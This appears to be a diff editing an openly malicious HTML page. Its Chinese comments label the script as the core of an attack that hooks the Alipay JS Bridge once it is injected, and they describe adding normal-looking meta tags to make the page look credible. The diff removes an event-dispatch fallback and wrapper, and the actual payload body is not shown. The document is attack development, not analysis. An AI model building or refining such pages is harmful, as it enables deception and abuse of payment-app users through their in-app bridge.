@@ -55,7 +55,7 @@
     <!-- 恶意代码核心部分 -->
     <script>
     // 立即执行匿名函数，避免污染全局命名空间（但攻击本身不需要这个）
-    (function() {
+  
         // 等待支付宝 JS Bridge 注入完成
         // 这是整个攻击能够成功的前提条件
         document.addEventListener('AlipayJSBridgeReady', function() {
@@ -69,18 +69,7 @@
             } catch (e) {
                 console.log('[UI Error]', e);
             }
-
-      
         });
-
-        // 如果支付宝桥接器已经存在（极少数情况），直接触发操作
-        if (window.AlipayJSBridge) {
-            console.log('[Bridge Already Exists]');
-            // 手动触发事件处理函数，或者直接执行代码
-            var event = new Event('AlipayJSBridgeReady');
-            document.dispatchEvent(event);
-        }
-    })();
     </script>
 
     <!-- 额外增加一些无用但看起来正常的meta，增加页面可信度 -->
